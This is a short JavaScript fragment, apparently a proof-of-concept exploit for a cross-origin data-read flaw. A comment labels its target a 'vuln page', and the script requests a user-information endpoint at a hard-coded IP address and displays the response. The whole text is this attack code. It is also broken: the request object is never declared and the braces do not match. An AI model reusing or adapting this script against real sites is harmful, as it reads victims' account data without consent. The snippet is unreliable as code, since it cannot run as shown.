function loadXMLDoc()
{

    xhr.onreadystatechange=function()

        {
            var datas=xhr.responseText;
            alert(datas);
        }
    }
    //request vuln page
    xhr.open("GET","http://139.224.42.111/api/user/passport/auth/getUserInfo","true") //网页地址
    xhr.send();
}
loadXMLDoc();
